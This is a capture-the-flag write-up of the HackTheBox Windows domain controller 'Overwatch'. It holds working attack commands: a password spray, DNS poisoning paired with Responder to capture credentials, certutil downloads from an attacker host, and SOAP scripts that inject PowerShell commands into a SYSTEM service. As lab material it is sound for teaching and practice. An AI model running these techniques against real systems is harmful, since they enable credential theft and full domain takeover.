# Overwatch

**By Stager** | FashilHack

---

## What is this machine

Overwatch is a medium-difficulty Windows Active Directory machine on HackTheBox. The entire attack chain starts from a single custom .NET binary sitting on an open SMB share. That one file gave us hardcoded credentials, revealed internal infrastructure, and contained the vulnerability that eventually got us to SYSTEM.

This machine is a perfect example of why custom applications are always the most interesting thing to find during enumeration. Developers leave secrets inside compiled code all the time — and on this box, that one mistake unlocked everything from initial access all the way to root.

---

## Target

```
IP:       10.129.244.81
Domain:   overwatch.htb
DC Name:  S200401
OS:       Windows Server 2022 Build 20348
```

---

## Step 1 — Nmap Reconnaissance

Started with a fast port discovery scan to find everything open:

```bash
nmap -p- --min-rate 5000 10.129.244.81
```
![[nmap1.png]]

This returned a large number of open ports. The important ones:

```
53/tcp    — DNS (domain controller)
88/tcp    — Kerberos
135/tcp   — MSRPC
139/tcp   — NetBIOS
389/tcp   — LDAP
445/tcp   — SMB
3389/tcp  — RDP
6520/tcp  — Unknown (later confirmed as MSSQL)
3268/tcp  — GlobalCatalog LDAP
```

Then ran a detailed service scan to get versions and scripts:

```bash
sudo nmap -T4 -sV -A -Pn 10.129.244.81
```
![[stager/writeups/write-ups/overwatch/nmap.png]]

The detailed scan confirmed this is a Domain Controller:

- Domain: `overwatch.htb`
- Computer Name: `S200401`
- OS: Windows Server 2022 Build 20348
- RDP certificate subject: `S200401.overwatch.htb`

Added the domain to `/etc/hosts`:

```bash
echo "10.129.244.81 overwatch.htb S200401.overwatch.htb" >> /etc/hosts
```

---

## Step 2 — Initial Enumeration

### RPC Enumeration

Tried anonymous RPC access to enumerate domain information:

```bash
rpcclient -U "" -N 10.129.244.81
```
![[rpcdnied.png]]

Everything returned `NT_STATUS_ACCESS_DENIED`. Anonymous RPC is locked down — nothing useful here.

### BlueKeep Check

RDP was open on 3389. Ran a BlueKeep check through Metasploit since it was worth a quick attempt:

```bash
msf > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
msf > set rhost 10.129.244.81
msf > run
```

![[taregt not vuln to bluekeep i think.png]]

Not vulnerable. Dead end.

### SMB Enumeration — The Big Find

Tried SMB with no credentials:

```bash
smbclient //10.129.244.81/software$
```
![[got access to smb with no pass with share.png]]

Anonymous read access worked on the `software$` share. Inside the `Monitoring` folder:

```
overwatch.exe
overwatch.exe.config
overwatch.pdb
EntityFramework.dll
EntityFramework.SqlServer.dll
Microsoft.Management.Infrastructure.dll
System.Data.SQLite.dll
System.Management.Automation.dll
```

A custom executable with a PDB debug file and a config file. This is the most interesting thing on the machine. Downloaded everything:

```bash
smb: \monitoring\> mget *
```

---

## Step 3 — Reverse Engineering overwatch.exe

### The Config File First

Before touching the binary, read the config file:

```bash
cat overwatch.exe.config
```
![[service monitor running on local port at 8000 we can access inside evil-winrm.png]]

The config revealed the application is a **WCF (Windows Communication Foundation) service** running on port 8000 at `http://overwatch.htb:8000/MonitorService`. This port is not exposed externally — but from inside the machine we can reach it locally. This matters later.

### Why strings -el and Not Just strings

The first attempt with standard `strings` returned nothing useful. This is a critical lesson about .NET binaries:

- Regular native executables store strings as **ASCII** → `strings file.exe`
- **.NET executables store strings as UTF-16 Little Endian** → `strings -el file.exe`

The `-e` flag sets encoding, `l` means little-endian 16-bit. Skipping this on a .NET binary means missing almost all actual string content.

```bash
# Regular strings — misses almost everything in .NET
strings overwatch.exe | less

# The correct command for .NET binaries
strings -el overwatch.exe
```
![[found creds.png]]

### What the Strings Revealed

The `-el` output handed us everything we needed:

```
Already monitoring.
Monitoring started.
SELECT * FROM Win32_ProcessStartTrace
INSERT INTO EventLog (Timestamp, EventType, Details) VALUES (GETDATE(), '
Stop-Process -Name  -Force
Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;
Microsoft\Edge\User Data\Default\History
SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5
```

From these strings the entire application purpose is clear:

- Monitors process creation via WMI (`Win32_ProcessStartTrace`)
- Reads Microsoft Edge browsing history every 30 seconds
- Logs everything to SQL Server database `SecurityLogs`
- Can terminate processes via PowerShell `Stop-Process`
- Contains a **hardcoded SQL Server connection string with plaintext credentials**

```
sqlsvc : TI0LKcfHzZw1Vv
```

> **Rule:** Always run `strings -el` on any Windows executable. Never just `strings`. On .NET binaries this is the difference between finding everything and finding nothing.

### Deeper Analysis with ILSpy

Decompiled the binary back to C# for a complete picture:

```bash
dotnet tool install ilspycmd --version 8.2.0.7535 -g
~/.dotnet/tools/ilspycmd overwatch.exe
```

The decompiled output confirmed three callable WCF methods:

- `StartMonitoring()` — starts WMI process watching
- `StopMonitoring()` — stops monitoring
- `KillProcess(string processName)` — **the vulnerable one**

The `KillProcess` method contained this:

```csharp
string text = "Stop-Process -Name " + processName + " -Force";
```

User input directly concatenated into a PowerShell command with zero sanitization. This is a command injection vulnerability — and since the service runs as SYSTEM, exploiting it means instant root. Filed away for later.

---
## Step 4 — Domain Enumeration
### Enumerating Users via LDAP

With `sqlsvc` credentials, enumerated the domain:

```bash
netexec ldap 10.129.244.81 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' --users
```

Credentials are valid. 105 users returned. Notable accounts: `sqlmgmt` alongside `Administrator`, `Guest`, `krbtgt`, and ~100 `First.Last` format domain users.

![[users found.png]]

### Extracting Users with awk
```bash
netexec ldap 10.129.244.81 -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' --users \
  | awk '{print $5}' | grep '\.' > users.txt
```
### Validating with Kerbrute
```bash
kerbrute userenum users.txt -d overwatch.htb --dc 10.129.244.81
awk '/VALID USERNAME/{print $7}' kerbrute_output.txt | cut -d'@' -f1 > validusers.txt
```

All 100 tested users came back valid.

![[spray creds i found on all users no login.png]]

### Password Spray
Sprayed the `sqlsvc` password across all accounts to check for reuse:

```bash
kerbrute passwordspray -d overwatch.htb --dc 10.129.244.81 validusers.txt 'TI0LKcfHzZw1Vv'
```

![[spray creds i found on all users no login.png]]

Only `sqlsvc` matched. No reuse on any other account. Need another path.


---

## Step 5 — MSSQL Access & Linked Server Discovery

### Connecting to SQL Server

```bash
impacket-mssqlclient 'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.244.81' \
  -port 6520 -windows-auth
```

### Finding the Linked Server

Standard SQL Server post-exploitation always includes checking `sys.servers`. A linked server is a configuration that lets one SQL Server automatically connect to and authenticate against another — using stored credentials:

```sql
SELECT name, provider, data_source FROM sys.servers;
```

Two entries. The local instance `S200401\SQLEXPRESS` and:

```
name: SQL07
provider: SQLNCLI
data_source: SQL07
```

`SQL07` is a linked server. The local SQL Server is configured to authenticate to a remote host called `SQL07` automatically. If we redirect that hostname to our machine, the SQL Server will send us those stored credentials when it tries to connect.

---
## Step 6 — DNS Poisoning & Credential Capture
### The Attack Explained

Three things make this work together:

**1. Linked servers authenticate automatically** When SQL Server connects to `SQL07`, it resolves the hostname via DNS then sends stored credentials automatically — no user interaction needed.

**2. sqlsvc can write DNS records** Service accounts in Active Directory sometimes have permission to add DNS records. `sqlsvc` has this permission — meaning we can tell the entire domain that `SQL07 = our IP`.

**3. Responder captures the authentication** Responder pretends to be a SQL Server. When the real SQL Server connects to our machine thinking it is `SQL07`, Responder captures the credentials being sent — in cleartext.

### Fixing the Port 53 Conflict

`systemd-resolved` must be fully stopped or Responder's DNS module fails to start:

```bash
sudo systemctl stop systemd-resolved
sudo systemctl stop systemd-resolved-varlink.socket
sudo systemctl stop systemd-resolved-monitor.socket
sudo systemctl mask systemd-resolved
sudo fuser -k 53/tcp
sudo fuser -k 53/udp

# Verify — should return nothing
sudo ss -tlnp | grep :53
```

Start Responder:
```bash
sudo responder -I tun0 -v
```

### Adding the Malicious DNS Record

Using `DNSUpdate.py` from Responder's tools, added a DNS A record mapping `SQL07` to our attacker IP. The valid action flags are `ad` (add), `rm` (remove), `an` (analyze):

```bash
python3 /usr/share/responder/tools/DNSUpdate.py \
  -DNS 10.129.244.81 \
  -u 'overwatch\sqlsvc' \
  -p 'TI0LKcfHzZw1Vv' \
  -a 'ad' \
  -r 'SQL07' \
  -d '10.10.17.239'
```

![[changed dns to my attacker.png]]

`result: 0, description: success`. Every machine in the domain now resolves `SQL07` to our machine.

### Triggering the Connection

Adding the DNS record alone is not enough — the SQL Server only connects when something forces it. From within the impacket-mssqlclient session:

```sql
EXEC sp_testlinkedserver [SQL07];
```

![[got creds of sqlmgmt.png]]

The SQL Server tried to connect to `SQL07`, hit our machine, and Responder captured everything:

```
[MSSQL] Received connection from 10.129.244.81
[MSSQL] Cleartext Hostname : SQL07
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

![[both dns change and responder capture.png]]

```
sqlmgmt : bIhBbzMMnB82yx
```

The connection failure error on the SQL side is expected — Responder is not a real SQL Server. But it captured the credentials before the connection dropped.

---

## Step 7 — Initial Access as sqlmgmt

### Validating Credentials

```bash
netexec winrm 10.129.244.81 -u "sqlmgmt" -p "bIhBbzMMnB82yx"
```

![netexec WinRM showing Pwn3d! for sqlmgmt on port 5985 Windows Server 2022 S200401](https://claude.ai/chat/check_creds_valid_using_netexec.png)

![[check creds valid using netexec.png]]

`Pwn3d!` — WinRM access confirmed.

### Connecting with Evil-WinRM

```bash
evil-winrm -i 10.129.244.81 -u sqlmgmt -p 'bIhBbzMMnB82yx'
```
![[evilwinrm login.png]]

### User Flag

```bash
cd Desktop
download user.txt
```
![[stager/writeups/write-ups/overwatch/user flag.png]]

User flag captured.

---

## Step 8 — Post Exploitation Enumeration

Uploaded and ran WinPEAS to identify privilege escalation paths:

```bash
# Kali — serve it
python3 -m http.server 80

# Target — download and run
certutil -urlcache -f -split http://10.10.17.239/winPEASx64.exe
.\winPEASx64.exe
```
![[upload and run winpeas.png]]

WinPEAS confirmed the WCF monitoring service running locally on port 8000. Combined with the command injection found during reverse engineering, the privilege escalation path is clear.

---

## Step 9 — Privilege Escalation via WCF Command Injection

### The Vulnerability

From the ILSpy decompilation, `KillProcess` builds its PowerShell command like this:

```csharp
string text = "Stop-Process -Name " + processName + " -Force";
```

Supplying `a; whoami #` as the process name results in:

```powershell
Stop-Process -Name a; whoami # -Force

# a      — fake process name, harmless
# ;      — PowerShell command separator
# whoami — our injected command
# #      — comments out -Force so syntax stays valid
```

The service is on `http://localhost:8000/MonitorService` — firewalled from outside, reachable from within our WinRM session.

### Crafting the SOAP Exploit

WCF services communicate via SOAP — XML-based messaging. To call `KillProcess`, a properly formatted SOAP envelope is required. Created `exploit.ps1` on Kali:

```powershell
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("Content-Type","text/xml")
$wc.Headers.Add("SOAPAction",'"http://tempuri.org/IMonitoringService/KillProcess"')

$body = @'
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>a; whoami #</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
'@

$wc.UploadString("http://localhost:8000/MonitorService",$body)
```

![[exploit uploaded.png]]

### Executing on Target

Hosted scripts on a Python HTTP server on Kali and downloaded to target using `certutil` — `iwr` failed due to DNS resolution issues so `certutil -urlcache -f -split` was used instead:

```bash
# Kali
python3 -m http.server 80
```

```bash
# Target WinRM session
cd C:\Users\sqlmgmt\Downloads
certutil -urlcache -f -split http://10.10.17.239/exploit.ps1
powershell -ExecutionPolicy Bypass -File exploit.ps1
```

![[service responded meaning injected command whoami worked.png]]

The SOAP response returned:

```xml
<KillProcessResult>nt authority\system</KillProcessResult>
```

The monitoring service runs as **NT AUTHORITY\SYSTEM**. Every command injected through it runs as SYSTEM.

### Retrieving the Root Flag

Created `rootscript.ps1` — identical structure, different injected command:

```powershell
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("Content-Type","text/xml; charset=utf-8")
$wc.Headers.Add("SOAPAction",'"http://tempuri.org/IMonitoringService/KillProcess"')

$body = @"
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>a; type C:\Users\Administrator\Desktop\root.txt #</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>
"@

$wc.UploadString("http://localhost:8000/MonitorService",$body)
```

![[root exploit.png]]


```bash
certutil -urlcache -f -split http://10.10.17.239/rootscript.ps1
powershell -ExecutionPolicy Bypass -File rootscript.ps1
```

![[root exploit uploaded.png]]


![[stager/writeups/write-ups/overwatch/root flag.png]]
Root flag captured. Machine fully compromised.

---

## Proof
![[finished.png]]

---

## The Full Chain

```
nmap → DC identified, SMB and MSSQL on non-standard port 6520
  ↓
rpcclient anonymous → NT_STATUS_ACCESS_DENIED
  ↓
BlueKeep RDP check → not vulnerable
  ↓
smbclient anonymous → software$ share open
  ↓
Monitoring folder → overwatch.exe + config downloaded
  ↓
overwatch.exe.config → WCF service on port 8000 confirmed
  ↓
strings -el overwatch.exe → sqlsvc:TI0LKcfHzZw1Vv hardcoded
  ↓
ILSpy decompile → KillProcess command injection identified
  ↓
netexec LDAP → 105 domain users enumerated
  ↓
kerbrute userenum → all users validated
  ↓
kerbrute passwordspray → no password reuse found
  ↓
impacket-mssqlclient port 6520 → SQL Server access
  ↓
sys.servers → SQL07 linked server discovered
  ↓
systemd-resolved stopped → Responder DNS starts clean
  ↓
DNSUpdate.py → SQL07 A record poisoned to 10.10.17.239
  ↓
Responder + sp_testlinkedserver → sqlmgmt:bIhBbzMMnB82yx cleartext captured
  ↓
netexec WinRM → Pwn3d! confirmed on port 5985
  ↓
Evil-WinRM → shell as sqlmgmt, user flag
  ↓
WinPEAS → WCF service confirmed as SYSTEM on port 8000
  ↓
exploit.ps1 SOAP injection → nt authority\system confirmed
  ↓
rootscript.ps1 SOAP injection → root flag retrieved
```

---

## What I Learned

**Always run `strings -el` on Windows binaries.** .NET stores strings in UTF-16 LE — standard `strings` misses everything. This single flag was the difference between finding credentials and finding nothing. Run both on every Windows executable.

**Custom applications are the highest value target during enumeration.** The entire chain started from one exe on an open SMB share. Developers hardcode secrets, expose internal services through config files, and write vulnerable code that makes it into production. Always download and analyze custom binaries.

**SQL linked server enumeration belongs on every MSSQL checklist.** Querying `sys.servers` costs nothing. Combined with DNS write permissions, a linked server becomes a cleartext credential capture waiting to happen.

**DNS write permissions are more dangerous than they look.** A service account that can add AD DNS records can redirect hostname resolution across the entire domain. On this box that meant intercepting SQL Server authentication — the same technique applies to any service that resolves hostnames before authenticating.

**Locally-listening services are still attack surface.** Port 8000 was invisible from outside. From inside our WinRM session it was fully reachable. Always check `netstat -ano` after getting a foothold to see what the firewall is hiding from the outside.

**Command injection in a SYSTEM process equals instant root.** The `KillProcess` bug was a basic string concatenation mistake. But because the service ran as SYSTEM, one SOAP request with a semicolon in the right place was game over.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._